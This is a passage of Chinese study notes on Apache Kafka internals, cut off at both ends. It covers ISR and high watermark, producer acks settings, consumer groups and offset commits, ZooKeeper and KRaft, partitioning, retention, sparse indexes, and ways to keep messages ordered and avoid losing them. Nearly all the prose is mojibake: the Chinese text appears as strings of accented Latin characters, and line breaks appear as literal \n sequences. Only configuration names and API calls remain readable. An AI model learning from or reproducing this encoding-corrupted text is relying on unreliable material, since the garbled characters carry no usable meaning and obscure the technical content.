é›†åˆã€‚\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰ ISR ä¸­çš„å‰¯æœ¬æ‰æœ‰èµ„æ ¼æ™‹å‡ä¸º Leaderï¼ˆä¸è¿‡è¿™ä¸ªåŸåˆ™ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹ç›¸åº”çš„å‚æ•°é…ç½®æ¥æ”¹å˜ï¼‰\n\n##### 2. HW\n\n ISRä¸HWå’ŒLEOä¹Ÿæœ‰ç´§å¯†çš„å…³ç³»ã€‚HWæ˜¯High Watermarkçš„ç¼©å†™ï¼Œä¿—ç§°é«˜æ°´ä½ï¼Œå®ƒæ ‡è¯†äº†ä¸€ä¸ªç‰¹å®šçš„æ¶ˆæ¯åç§»é‡ï¼ˆoffsetï¼‰ï¼Œæ¶ˆè´¹è€…åªèƒ½æ‹‰å–åˆ°è¿™ä¸ªoffsetä¹‹å‰çš„æ¶ˆæ¯ã€‚ \n\nLEOæ˜¯Log End Offsetçš„ç¼©å†™ï¼Œå®ƒæ ‡è¯†å½“å‰æ—¥å¿—æ–‡ä»¶ä¸­ä¸‹ä¸€æ¡å¾…å†™å…¥æ¶ˆæ¯çš„offsetï¼ŒLEOçš„å¤§å°ç›¸å½“äºå½“å‰æ—¥å¿—åˆ†åŒºä¸­æœ€åä¸€æ¡æ¶ˆæ¯çš„offsetå€¼åŠ 1ã€‚\n\nåˆ†åŒºISRé›†åˆä¸­çš„æ¯ä¸ªå‰¯æœ¬éƒ½ä¼šç»´æŠ¤è‡ªèº«çš„LEOï¼Œè€ŒISRé›†åˆä¸­æœ€å°çš„LEOå³ä¸ºåˆ†åŒºçš„HWï¼Œå¯¹æ¶ˆè´¹è€…è€Œè¨€åªèƒ½æ¶ˆè´¹HWä¹‹å‰çš„æ¶ˆæ¯ã€‚ \n\n### 1.5 ç”Ÿäº§è€…\n\n##### 1. ACK æœºåˆ¶\n\nKafkaçš„Produceræœ‰ä¸‰ç§ackæœºåˆ¶ï¼Œå‚æ•°å€¼æœ‰0ã€1 å’Œ ALL\n\n+ 0ï¼š ç›¸å½“äºå¼‚æ­¥æ“ä½œï¼ŒProducer ä¸éœ€è¦Leaderç»™äºˆå›å¤ï¼Œå‘é€å®Œå°±è®¤ä¸ºæˆåŠŸï¼Œç»§ç»­å‘é€ä¸‹ä¸€æ¡ï¼ˆæ‰¹ï¼‰Messageã€‚æ­¤æœºåˆ¶å…·æœ‰æœ€ä½å»¶è¿Ÿï¼Œä½†æ˜¯æŒä¹…æ€§å¯é æ€§ä¹Ÿæœ€å·®ï¼Œå½“æœåŠ¡å™¨å‘ç”Ÿæ•…éšœæ—¶ï¼Œå¾ˆå¯èƒ½å‘ç”Ÿæ•°æ®ä¸¢å¤±ã€‚\n+ 1ï¼š Kafka é»˜è®¤çš„è®¾ç½®ã€‚è¡¨ç¤º Producer è¦ Leader ç¡®è®¤å·²æˆåŠŸæ¥æ”¶æ•°æ®æ‰å‘é€ä¸‹ä¸€æ¡ï¼ˆæ‰¹ï¼‰Messageã€‚ä¸è¿‡ Leader å®•æœºï¼ŒFollower å°šæœªå¤åˆ¶çš„æƒ…å†µä¸‹ï¼Œæ•°æ®å°±ä¼šä¸¢å¤±ã€‚æ­¤æœºåˆ¶æä¾›äº†è¾ƒå¥½çš„æŒä¹…æ€§å’Œè¾ƒä½çš„å»¶è¿Ÿæ€§ã€‚\n+ ALLï¼š Leader æ¥æ”¶åˆ°æ¶ˆæ¯ä¹‹åï¼Œè¿˜å¿…é¡»è¦æ±‚ISRåˆ—è¡¨é‡Œè·ŸLeaderä¿æŒåŒæ­¥çš„é‚£äº›Followeréƒ½ç¡®è®¤æ¶ˆæ¯å·²åŒæ­¥ï¼ŒProducer æ‰å‘é€ä¸‹ä¸€æ¡ï¼ˆæ‰¹ï¼‰Messageã€‚æ­¤æœºåˆ¶æŒä¹…æ€§å¯é æ€§æœ€å¥½ï¼Œä½†å»¶æ—¶æ€§æœ€å·®ã€‚\n\nä¸è¿‡ï¼Œç«¯åˆ°ç«¯å»¶è¿Ÿæ˜¯æŒ‡ä»æ¶ˆæ¯ç”Ÿæˆåˆ°å¯ä¾›æ¶ˆè´¹è€…è¯»å–çš„æ—¶é—´ï¼Œè¿™å¯¹3ç§é…ç½®æ¥è¯´éƒ½æ˜¯ä¸€æ ·çš„ã€‚è¿™æ˜¯å› ä¸ºä¸ºäº†ä¿æŒä¸€è‡´æ€§ï¼Œåœ¨æ¶ˆæ¯è¢«å†™å…¥æ‰€æœ‰åŒæ­¥å‰¯æœ¬ä¹‹å‰ï¼ŒKafkaä¸å…è®¸æ¶ˆè´¹è€…è¯»å–å®ƒä»¬ã€‚ \n\nä¸ºäº†æå‡é›†ç¾¤çš„æ•°æ®æŒä¹…æ€§ï¼Œå¯ä»¥å°†min.insync.replicasè®¾ç½®ä¸º2ï¼Œç¡®ä¿è‡³å°‘æœ‰ä¸¤ä¸ªå‰¯æœ¬è·Ÿç”Ÿäº§è€…ä¿æŒâ€œåŒæ­¥â€ã€‚ç”Ÿäº§è€…éœ€è¦é…åˆå°†ackè®¾ç½®ä¸ºallï¼Œè¿™æ ·å°±å¯ä»¥ç¡®ä¿è‡³å°‘æœ‰ä¸¤ä¸ªå‰¯æœ¬ï¼ˆé¦–é¢†å’Œå¦ä¸€ä¸ªå‰¯æœ¬ï¼‰ç¡®è®¤å†™å…¥æˆåŠŸï¼Œä»è€Œé˜²æ­¢åœ¨ä»¥ä¸‹æƒ…å†µä¸‹ä¸¢å¤±æ•°æ®ã€‚å› ä¸ºéœ€è¦é¢å¤–çš„å¼€é”€ï¼Œæ‰€ä»¥æ•ˆç‡ä¼šæœ‰æ‰€é™ä½ã€‚\n\n### 1.6 æ¶ˆè´¹è€…\n\næ¶ˆè´¹è€…è®¢é˜…ä¸€ä¸ªæˆ–å¤šä¸ªä¸»é¢˜ï¼Œå¹¶æŒ‰ç…§æ¶ˆæ¯ç”Ÿæˆçš„é¡ºåºè¯»å–å®ƒä»¬ã€‚æ¶ˆè´¹è€…é€šè¿‡æ£€æŸ¥æ¶ˆæ¯çš„åç§»é‡æ¥åŒºåˆ†å·²ç»è¯»å–è¿‡çš„æ¶ˆæ¯ã€‚åç§»é‡æ˜¯å¦ä¸€ç§å…ƒæ•°æ®ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸æ–­é€’å¢çš„æ•´æ•°å€¼ï¼Œåœ¨åˆ›å»ºæ¶ˆæ¯æ—¶ï¼ŒKafkaä¼šæŠŠå®ƒæ·»åŠ åˆ°æ¶ˆæ¯é‡Œã€‚\n\nåœ¨ç»™å®šçš„åˆ†åŒºé‡Œï¼Œæ¯ä¸ªæ¶ˆæ¯çš„åç§»é‡éƒ½æ˜¯å”¯ä¸€çš„ã€‚æ¶ˆè´¹è€…æŠŠæ¯ä¸ªåˆ†åŒºæœ€åè¯»å–çš„æ¶ˆæ¯åç§»é‡ä¿å­˜åœ¨Zookeeperæˆ–Kafkaä¸Šï¼Œå¦‚æœæ¶ˆè´¹è€…å…³é—­æˆ–é‡å¯ï¼Œå®ƒçš„è¯»å–çŠ¶æ€ä¸ä¼šä¸¢å¤±ã€‚ \n\n##### 1. æ¶ˆè´¹è€…ç»„\n\næ¶ˆè´¹è€…æ˜¯æ¶ˆè´¹è€…ç¾¤ç»„çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¼šæœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ¶ˆè´¹è€…å…±åŒè¯»å–ä¸€ä¸ªä¸»é¢˜ã€‚ç¾¤ç»„ä¿è¯æ¯ä¸ªåˆ†åŒºåªèƒ½è¢«ä¸€ä¸ªæ¶ˆè´¹è€…ä½¿ç”¨ã€‚\n\nä¾‹å¦‚æœ‰3ä¸ªæ¶ˆè´¹è€…åŒæ—¶è¯»å–ä¸€ä¸ªä¸»é¢˜ã€‚å…¶ä¸­çš„ä¸¤ä¸ªæ¶ˆè´¹è€…å„è‡ªè¯»å–ä¸€ä¸ªåˆ†åŒºï¼Œå¦å¤–ä¸€ä¸ªæ¶ˆè´¹è€…è¯»å–å…¶ä»–ä¸¤ä¸ªåˆ†åŒºã€‚æ¶ˆè´¹è€…ä¸åˆ†åŒºä¹‹é—´çš„æ˜ å°„é€šå¸¸è¢«ç§°ä¸ºæ¶ˆè´¹è€…å¯¹åˆ†åŒºçš„æ‰€æœ‰æƒå…³ç³»  \n\n-  ä¸€ä¸ªä¸»é¢˜çš„åˆ†åŒºï¼Œåªèƒ½è¢«æ¶ˆè´¹ç»„å†…ä¸€ä¸ªæ¶ˆè´¹è€…æ¶ˆè´¹ã€‚\n- ä¸åŒæ¶ˆè´¹è€…ç»„ï¼Œå¯ä»¥æ¶ˆè´¹åŒä¸€ä¸ªTopicï¼Œäº’ä¸å½±å“ã€‚\n\n##### 2. å†å‡è¡¡\n\næ¶ˆè´¹è€…ä¼šå‘è¢«æŒ‡å®šä¸ºç¾¤ç»„åè°ƒå™¨çš„brokerï¼ˆä¸åŒæ¶ˆè´¹è€…ç¾¤ç»„çš„åè°ƒå™¨å¯èƒ½ä¸åŒï¼‰å‘é€å¿ƒè·³ï¼Œå¦‚æœæ¶ˆè´¹è€…åœ¨è¶³å¤Ÿé•¿çš„ä¸€æ®µæ—¶é—´å†…æ²¡æœ‰å‘é€å¿ƒè·³ï¼Œé‚£ä¹ˆå®ƒçš„ä¼šè¯å°±å°†è¶…æ—¶ï¼Œç¾¤ç»„åè°ƒå™¨ä¼šè®¤ä¸ºå®ƒå·²ç»â€œæ­»äº¡â€ï¼Œè¿›è€Œè§¦å‘å†å‡è¡¡ã€‚\n\n session.timeout.msæŒ‡å®šäº†æ¶ˆè´¹è€…å¯ä»¥åœ¨å¤šé•¿æ—¶é—´å†…ä¸ä¸æœåŠ¡å™¨å‘ç”Ÿäº¤äº’è€Œä»ç„¶è¢«è®¤ä¸ºè¿˜â€œæ´»ç€â€ï¼Œé»˜è®¤æ˜¯10ç§’ã€‚\n\n##### 3. æäº¤åç§»é‡\n\né‚£ä¹ˆæ¶ˆè´¹è€…æ˜¯å¦‚ä½•æäº¤åç§»é‡çš„å‘¢ï¼Ÿæ¶ˆè´¹è€…ä¼šå‘ä¸€ä¸ªå«ä½œ __consumer_offsetçš„ä¸»é¢˜å‘é€æ¶ˆæ¯ï¼Œæ¶ˆæ¯é‡ŒåŒ…å«æ¯ä¸ªåˆ†åŒºçš„åç§»é‡ã€‚ enable.auto.commitï¼Œä½ å¯ä»¥å†³å®šè®©æ¶ˆè´¹è€…è‡ªåŠ¨æäº¤åç§»é‡ï¼Œä¹Ÿå¯ä»¥åœ¨ä»£ç é‡Œæ‰‹åŠ¨æäº¤åç§»é‡ã€‚\n\nå¦‚æœè§¦å‘å†å‡è¡¡ï¼Œå†å‡è¡¡å®Œæˆä¹‹åï¼Œæ¯ä¸ªæ¶ˆè´¹è€…å¯èƒ½ä¼šè¢«åˆ†é…æ–°çš„åˆ†åŒºï¼Œè€Œä¸æ˜¯ä¹‹å‰è¯»å–çš„é‚£ä¸ªã€‚ä¸ºäº†èƒ½å¤Ÿç»§ç»­ä¹‹å‰çš„å·¥ä½œï¼Œæ¶ˆè´¹è€…éœ€è¦è¯»å–æ¯ä¸ªåˆ†åŒºæœ€åä¸€æ¬¡æäº¤çš„åç§»é‡ï¼Œç„¶åä»åç§»é‡æŒ‡å®šçš„ä½ç½®ç»§ç»­è¯»å–æ¶ˆæ¯ã€‚ \n\nå‡è®¾æˆ‘ä»¬ä½¿ç”¨é»˜è®¤çš„5ç§’æäº¤æ—¶é—´é—´éš”ï¼Œå¹¶ä¸”æ¶ˆè´¹è€…åœ¨æœ€åä¸€æ¬¡æäº¤åç§»é‡ä¹‹å3ç§’ä¼šå‘ç”Ÿå´©æºƒã€‚å†å‡è¡¡å®Œæˆä¹‹åï¼Œæ¥ç®¡åˆ†åŒºçš„æ¶ˆè´¹è€…å°†ä»æœ€åä¸€æ¬¡æäº¤çš„åç§»é‡çš„ä½ç½®å¼€å§‹è¯»å–æ¶ˆæ¯ã€‚è¿™ä¸ªåç§»é‡å®é™…ä¸Šè½åäº†3ç§’ï¼Œæ‰€ä»¥åœ¨è¿™3ç§’å†…åˆ°è¾¾çš„æ¶ˆæ¯ä¼šè¢«é‡å¤å¤„ç†ã€‚å¯ä»¥é€šè¿‡ä¿®æ”¹æäº¤æ—¶é—´é—´éš”æ¥æ›´é¢‘ç¹åœ°æäº¤åç§»é‡ï¼Œç¼©å°å¯èƒ½å¯¼è‡´é‡å¤æ¶ˆæ¯çš„æ—¶é—´çª—å£ï¼Œä½†æ— æ³•å®Œå…¨é¿å…ã€‚ \n\n\n\n### 1.7 Kafka å’Œ Zookeeper \n\nKafka ä¸¥é‡ä¾èµ–äº Zookeeper é›†ç¾¤ï¼ŒKafkaç”¨ZooKeeperæ¥ä¿å­˜é›†ç¾¤å…ƒæ•°æ®å’Œæ¶ˆè´¹è€…ä¿¡æ¯ã€‚\n\nä¸ºäº†ä¿è¯é«˜å¯ç”¨ï¼ŒZooKeeperä»¥é›†ç¾¤ï¼ˆè¢«ç§°ä¸ºç¾¤ç»„ï¼‰çš„æ–¹å¼è¿è¡Œã€‚ç”±äºä½¿ç”¨äº†å†å‡è¡¡ç®—æ³•ï¼Œå»ºè®®ä¸€ä¸ªZooKeeperé›†ç¾¤åº”è¯¥åŒ…å«å¥‡æ•°ä¸ªèŠ‚ç‚¹ï¼ˆæ¯”å¦‚3ä¸ªã€5ä¸ªç­‰ï¼‰ã€‚\n\n2021å¹´9æœˆå‘å¸ƒçš„Kafka 3.0åŒ…å«äº†å®ƒçš„ç¬¬ä¸€ä¸ªç”Ÿäº§ç‰ˆæœ¬ï¼ŒKafkaé›†ç¾¤æ—¢å¯ä»¥ä½¿ç”¨åŸºäºZooKeeperçš„ä¼ ç»Ÿæ§åˆ¶å™¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨KRaftã€‚ \n\n##### 1. broker\n\n Kafkaä½¿ç”¨ZooKeeperç»´æŠ¤é›†ç¾¤çš„æˆå‘˜ä¿¡æ¯ã€‚æ¯ä¸ªbrokeréƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œè¿™ä¸ªæ ‡è¯†ç¬¦æ—¢å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šï¼Œä¹Ÿå¯ä»¥è‡ªåŠ¨ç”Ÿæˆã€‚brokeråœ¨å¯åŠ¨æ—¶é€šè¿‡åˆ›å»ºZooKeeper ä¸´æ—¶èŠ‚ç‚¹æŠŠè‡ªå·±çš„IDæ³¨å†Œåˆ°ZooKeeperä¸­ ã€‚\n\næ§åˆ¶å™¨å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªbrokerï¼Œåªä¸è¿‡é™¤äº†æä¾›ä¸€èˆ¬çš„brokeråŠŸèƒ½ä¹‹å¤–ï¼Œå®ƒè¿˜è´Ÿè´£é€‰ä¸¾åˆ†åŒºé¦–é¢†ã€‚é›†ç¾¤ä¸­ç¬¬ä¸€ä¸ªå¯åŠ¨çš„brokerä¼šé€šè¿‡åœ¨ZooKeeperä¸­åˆ›å»ºä¸€ä¸ªåä¸º /controllerçš„ä¸´æ—¶èŠ‚ç‚¹è®©è‡ªå·±æˆä¸ºæ§åˆ¶å™¨ã€‚\n\nKafkaä¼šä½¿ç”¨ZooKeeperçš„ä¸´æ—¶èŠ‚ç‚¹æ¥é€‰ä¸¾æ§åˆ¶å™¨ï¼Œå¹¶ä¼šåœ¨brokeråŠ å…¥æˆ–é€€å‡ºé›†ç¾¤æ—¶é€šçŸ¥æ§åˆ¶å™¨ã€‚æ§åˆ¶å™¨è´Ÿè´£åœ¨brokeråŠ å…¥æˆ–é€€å‡ºé›†ç¾¤æ—¶è¿›è¡Œé¦–é¢†é€‰ä¸¾ã€‚æ§åˆ¶å™¨ä¼šä½¿ç”¨epochæ¥é¿å…â€œè„‘è£‚â€ã€‚\n\n##### 2. åç§»é‡\n\néšç€æ—¶é—´çš„æ¨ç§»ï¼ŒKafkaå¯¹ZooKeeperçš„ä¾èµ–åœ¨å‡å°‘ã€‚åœ¨æ—§ç‰ˆæœ¬Kafkaä¸­ï¼Œé™¤äº†brokerï¼Œæ¶ˆè´¹è€…ä¹Ÿåˆ©ç”¨ZooKeeperæ¥ä¿å­˜æ¶ˆè´¹è€…ç¾¤ç»„çš„ä¿¡æ¯å’Œå·²æ¶ˆè´¹çš„ä¸»é¢˜çš„ä¿¡æ¯ï¼Œå¹¶å®šæœŸæäº¤åˆ†åŒºçš„åç§»é‡ï¼ˆä¸ºäº†å®ç°æ¶ˆè´¹è€…ç¾¤ç»„å†…çš„æ•…éšœè½¬ç§»ï¼‰ã€‚å¦‚æœæ¶ˆè´¹è€…ä½¿ç”¨ZooKeeperæ¥ä¿å­˜åç§»é‡ï¼Œé‚£ä¹ˆæ¯ä¸€ä¸ªæ¶ˆè´¹è€…ä¼šåœ¨æ¯ä¸€ä¸ªæäº¤æ—¶é—´é—´éš”å†…æ‰§è¡Œä¸€æ¬¡ZooKeeperå†™å…¥æ“ä½œã€‚åˆç†çš„åç§»é‡æäº¤æ—¶é—´é—´éš”æ˜¯1åˆ†é’Ÿï¼Œå› ä¸ºå¦‚æœæœ‰æ¶ˆè´¹è€…å‘ç”Ÿæ•…éšœï¼Œé‚£ä¹ˆæ¶ˆè´¹è€…ç¾¤ç»„å°†åœ¨è¿™æ®µæ—¶é—´å†…è¯»å–åˆ°é‡å¤æ¶ˆæ¯ã€‚ \n\nä¸ç®¡æ€æ ·ï¼Œè¿˜æ˜¯å»ºè®®ä½¿ç”¨æ–°ç‰ˆçš„Kafkaæ¶ˆè´¹è€…ï¼Œå¹¶å°†åç§»é‡æäº¤åˆ°Kafkaï¼Œæ¶ˆé™¤å¯¹ZooKeeperçš„ä¾èµ–ã€‚ \n\n### 1.8 æ¶ˆæ¯å­˜å‚¨\n\n##### 1. åˆ†åŒºç­–ç•¥\n\n+ è½®è¯¢\n\n  å¦‚æœé”®ä¸ºnullï¼Œå¹¶ä¸”ä½¿ç”¨äº†é»˜è®¤çš„åˆ†åŒºå™¨ï¼Œé‚£ä¹ˆè®°å½•å°†è¢«éšæœºå‘é€ç»™ä¸»é¢˜çš„åˆ†åŒºã€‚åˆ†åŒºå™¨ä½¿ç”¨è½®è¯¢è°ƒåº¦(round-robin)ç®—æ³•å°†æ¶ˆæ¯å‡è¡¡åœ°åˆ†å¸ƒåˆ°å„ä¸ªåˆ†åŒºä¸­ã€‚ä»Kafka 2.4å¼€å§‹ï¼Œåœ¨å¤„ç†é”®ä¸ºnullçš„è®°å½•æ—¶ï¼Œé»˜è®¤åˆ†åŒºå™¨ä½¿ç”¨çš„è½®è¯¢è°ƒåº¦ç®—æ³•å…·å¤‡äº†é»æ€§ã€‚\n\n+ key æŒ‡å®šåˆ†åŒº\n\n  å¦‚æœé”®ä¸ä¸ºç©ºä¸”ä½¿ç”¨äº†é»˜è®¤çš„åˆ†åŒºå™¨ï¼Œé‚£ä¹ˆKafkaä¼šå¯¹é”®è¿›è¡Œå“ˆå¸Œï¼ˆä½¿ç”¨Kafkaè‡ªå·±çš„å“ˆå¸Œç®—æ³•ï¼Œå³ä½¿å‡çº§Javaç‰ˆæœ¬ï¼Œå“ˆå¸Œå€¼ä¹Ÿä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼‰ï¼Œç„¶åæ ¹æ®å“ˆå¸Œå€¼æŠŠæ¶ˆæ¯æ˜ å°„åˆ°ç‰¹å®šçš„åˆ†åŒºã€‚è¿™é‡Œçš„å…³é”®åœ¨äºåŒä¸€ä¸ªé”®æ€»æ˜¯è¢«æ˜ å°„åˆ°åŒä¸€ä¸ªåˆ†åŒºï¼Œ\n\n+ è‡ªå®šä¹‰ç­–ç•¥\n\n  å®ç° Partitioner æ¥å£å°±èƒ½è‡ªå®šä¹‰åˆ†åŒºç­–ç•¥ã€‚\n\n+ æŒ‡å®š Partiton å‘é€\n\n##### 2. ä¿ç•™æ¶ˆæ¯\n\nä¿ç•™æ¶ˆæ¯ï¼ˆåœ¨ä¸€å®šæœŸé™å†…ï¼‰æ˜¯Kafkaçš„ä¸€ä¸ªé‡è¦ç‰¹æ€§ã€‚Kafka brokeré»˜è®¤çš„æ¶ˆæ¯ä¿ç•™ç­–ç•¥æ˜¯è¿™æ ·çš„ï¼šè¦ä¹ˆä¿ç•™ä¸€æ®µæ—¶é—´ï¼ˆæ¯”å¦‚7å¤©ï¼‰ï¼Œè¦ä¹ˆä¿ç•™åˆ°æ¶ˆæ¯è¾¾åˆ°ä¸€å®šå¤§å°çš„å­—èŠ‚æ•°ï¼ˆæ¯”å¦‚1GBï¼‰ã€‚\n\nKafkaé€šå¸¸æ ¹æ®é…ç½®çš„æ—¶é—´é•¿çŸ­æ¥å†³å®šæ•°æ®å¯ä»¥è¢«ä¿ç•™å¤šä¹…ã€‚æˆ‘ä»¬ä½¿ç”¨log.retention.hourså‚æ•°æ¥é…ç½®æ—¶é—´ï¼Œé»˜è®¤ä¸º168å°æ—¶ï¼Œä¹Ÿå°±æ˜¯1å‘¨ã€‚ \n\nå¦ä¸€ç§æ•°æ®ä¿ç•™ç­–ç•¥æ˜¯é€šè¿‡è®¡ç®—å·²ä¿ç•™çš„æ¶ˆæ¯çš„å­—èŠ‚æ€»æ•°æ¥åˆ¤æ–­æ—§æ¶ˆæ¯æ˜¯å¦è¿‡æœŸã€‚è¿™ä¸ªå­—èŠ‚æ€»æ•°é˜ˆå€¼é€šè¿‡å‚æ•°log.retention.bytesæ¥æŒ‡å®šï¼Œå¯¹åº”çš„æ˜¯æ¯ä¸€ä¸ªåˆ†åŒºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸€ä¸ªä¸»é¢˜åŒ…å«8ä¸ªåˆ†åŒºï¼Œå¹¶ä¸”log.retention.bytesè¢«è®¾ç½®ä¸º1 GBï¼Œé‚£ä¹ˆè¿™ä¸ªä¸»é¢˜æœ€å¤šå¯ä»¥ä¿ç•™8 GBçš„æ•°æ®ã€‚ \n\n### 1.9 ç¨€ç–ç´¢å¼•\n\nkafka æ‰€é¢ä¸´çš„æŸ¥è¯¢åœºæ™¯å…¶å®å¾ˆç®€å•ï¼šèƒ½æŒ‰ç…§ offset æˆ–è€… timestamp æŸ¥åˆ°æ¶ˆæ¯å³å¯ã€‚\n\næ¶ˆæ¯çš„ offset å®Œå…¨å¯ä»¥è®¾è®¡æˆæœ‰åºçš„ï¼ˆå®é™…ä¸Šæ˜¯ä¸€ä¸ªå•è°ƒé€’å¢ long ç±»å‹çš„å­—æ®µï¼‰ï¼Œè¿™æ ·æ¶ˆæ¯åœ¨æ—¥å¿—æ–‡ä»¶ä¸­æœ¬èº«å°±æ˜¯æœ‰åºå­˜æ”¾çš„äº†ã€‚å¯ä»¥å°†æ¶ˆæ¯åˆ’åˆ†æˆè‹¥å¹²ä¸ª blockï¼Œåªç´¢å¼•æ¯ä¸ª block ç¬¬ä¸€æ¡æ¶ˆæ¯çš„ offset å³å¯ã€‚\n\nå½“ç»™å®šä¸€ä¸ª offset æ—¶ï¼ŒKafka é‡‡ç”¨çš„æ˜¯äºŒåˆ†æŸ¥æ‰¾æ¥é«˜æ•ˆå®šä½ä¸å¤§äº offset çš„ç‰©ç†ä½ç§»ï¼Œç„¶åæ‰¾åˆ°ç›®æ ‡æ¶ˆæ¯ã€‚å¦å¤–å¯ä»¥é€šè¿‡ mmapï¼ˆmemory mapped filesï¼‰ è¯»å†™ä¸Šé¢æåˆ°çš„ç¨€ç–ç´¢å¼•æ–‡ä»¶ï¼Œè¿›ä¸€æ­¥æé«˜æŸ¥è¯¢æ¶ˆæ¯çš„é€Ÿåº¦ã€‚\n\nå› ä¸ºç´¢å¼•æ–‡ä»¶æ˜¯ç¨€ç–çš„ï¼Œå®ƒä»¬ç›¸å¯¹è¾ƒå°ã€‚å°†å®ƒä»¬æ˜ å°„åˆ°å†…å­˜ä¸­å¯ä»¥åŠ å¿«æŸ¥æ‰¾è¿‡ç¨‹ï¼Œè¿™æ˜¯å†…å­˜æ˜ å°„æ–‡ä»¶æä¾›çš„ä¸»è¦å¥½å¤„ã€‚\n\n> æ³¨æ„ï¼šmmap å’Œ page cache æ˜¯ä¸¤ä¸ªæ¦‚å¿µï¼Œç½‘ä¸Šå¾ˆå¤šèµ„æ–™æŠŠå®ƒä»¬æ··æ·†åœ¨ä¸€èµ·ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰èµ„æ–™è°ˆåˆ° Kafka åœ¨è¯» log æ–‡ä»¶æ—¶ä¹Ÿç”¨åˆ°äº† mmapï¼Œé€šè¿‡å¯¹ 2.8.0 ç‰ˆæœ¬çš„æºç åˆ†æï¼Œè¿™ä¸ªä¿¡æ¯ä¹Ÿæ˜¯é”™è¯¯çš„ï¼Œå…¶å®åªæœ‰ç´¢å¼•æ–‡ä»¶çš„è¯»å†™æ‰ç”¨åˆ°äº† mmapã€‚\n\n# 2. å¤´è„‘é£æš´\n\n### 2.1 kafkaæ€§èƒ½é«˜çš„åŸå› \n\n<img src=\"kafkaåŸç†å’Œé«˜å¯ç”¨/640.png\" alt=\"å›¾ç‰‡\" style=\"zoom:50%;\" />\n\n1. æ‰¹é‡å‘é€ï¼Œæ¶ˆæ¯å‹ç¼©ã€‚\n\n2. ç£ç›˜é¡ºåºå†™ \n\n3. åˆ©ç”¨æ“ä½œç³»ç»Ÿé¡µç¼“å­˜ PageCache\n\n4. é›¶æ‹·è´æŠ€æœ¯\n\n5. åˆ†åŒºå¹¶å‘\n\n   \n\n### 2.2 æ€ä¹ˆä¿è¯æ¶ˆæ¯é¡ºåº\n\n##### 1. ç”Ÿäº§è€…é¡ºåº\n\nè¦ä¸¥æ ¼ä¿è¯ Kafka å‘æ¶ˆæ¯æœ‰åºï¼Œé¦–å…ˆè¦è€ƒè™‘åŒæ­¥å‘é€æ¶ˆæ¯ã€‚\n\n+ è®¾ç½®æ¶ˆæ¯å“åº”å‚æ•° `acks > 0`\n+ è°ƒç”¨ send æ–¹æ³•è¿”å›çš„ Future å¯¹è±¡çš„ get æ–¹å¼é˜»å¡ç­‰å¾…ç»“æœã€‚\n+ è®¾ç½® `enable.idempotence = true`ï¼Œå¹‚ç­‰ç‰¹æ€§è¿™ä¸ªç‰¹æ€§å¯ä»¥ç»™æ¶ˆæ¯æ·»åŠ åºåˆ—å·ï¼Œæ¯æ¬¡å‘é€ï¼Œä¼šæŠŠåºåˆ—å·é€’å¢ 1ã€‚\n\n##### 2. brokeré¡ºåº\n\n+ åŒç±»åˆ«æ¶ˆæ¯æœ‰åŒæ ·çš„ keyï¼Œå°±ä¼šè¢«åˆ†é…åˆ°åŒæ ·çš„åˆ†åŒºä¸­ï¼Œä¿è¯æœ‰åºã€‚\n+ 1ä¸ªTopicï¼ˆä¸»é¢˜ï¼‰åªåˆ›å»º1ä¸ªPartition(åˆ†åŒº)ã€‚\n\n##### 3. æ¶ˆè´¹è€…é¡ºåº\n\n+ åªä½¿ç”¨ä¸€ä¸ªæ¶ˆè´¹è€…ã€‚\n+ æ¶ˆè´¹ç«¯é‡‡ç”¨ä¸€ä¸ªé˜»å¡é˜Ÿåˆ—ã€‚\n+ æé«˜æ¶ˆè´¹ç«¯çš„å¤„ç†æ€§èƒ½é¿å…è§¦å‘Balanceã€‚\n\n\n\n### 2.3 å¦‚ä½•é¿å…ä¸¢å¤±æ¶ˆæ¯\n\n##### 1. ç”Ÿäº§ç«¯ä¸¢å¤±\n\nKafka Producer æ˜¯å¼‚æ­¥å‘é€æ¶ˆæ¯çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä½ è°ƒç”¨çš„æ˜¯ producer.send(msg) è¿™ä¸ª APIï¼Œé‚£ä¹ˆå®ƒé€šå¸¸ä¼šç«‹å³è¿”å›ï¼Œä½†æ­¤æ—¶ä½ ä¸èƒ½è®¤ä¸ºæ¶ˆæ¯å‘é€å·²æˆåŠŸå®Œæˆã€‚\n\nè§£å†³æ–¹æ¡ˆï¼š\n\n+ Producer æ°¸è¿œè¦ä½¿ç”¨å¸¦æœ‰å›è°ƒé€šçŸ¥çš„å‘é€ APIï¼Œä¹Ÿå°±æ˜¯è¯´ä¸è¦ä½¿ç”¨ producer.send(msg)ï¼Œè€Œè¦ä½¿ç”¨ producer.send(msg, callback)ã€‚\n+ é…ç½®äº† retries > 0 çš„ Producer èƒ½å¤Ÿè‡ªåŠ¨é‡è¯•æ¶ˆæ¯å‘é€ï¼Œé¿å…æ¶ˆæ¯ä¸¢å¤±ã€‚\n\n##### 2.  Broker ç«¯ä¸¢å¤±\n\nBroker ç«¯ä¸¢å¤±æ¶ˆæ¯æ‰çœŸçš„æ˜¯å› ä¸º Kafka é€ æˆçš„ã€‚\n\nKafka æ”¶åˆ°æ¶ˆæ¯åä¼šå…ˆå­˜å‚¨åœ¨ä¹Ÿç¼“å­˜ä¸­(Page Cache)ä¸­ï¼Œä¹‹åç”±æ“ä½œç³»ç»Ÿæ ¹æ®è‡ªå·±çš„ç­–ç•¥è¿›è¡Œåˆ·ç›˜æˆ–è€…é€šè¿‡ fsync å‘½ä»¤å¼ºåˆ¶åˆ·ç›˜ã€‚å¦‚æœç³»ç»ŸæŒ‚æ‰ï¼Œåœ¨ PageCache ä¸­çš„æ•°æ®å°±ä¼šä¸¢å¤±ã€‚\n\nè§£å†³æ–¹æ¡ˆï¼š\n\n+ è®¾ç½® acks = allã€‚acks æ˜¯ Producer 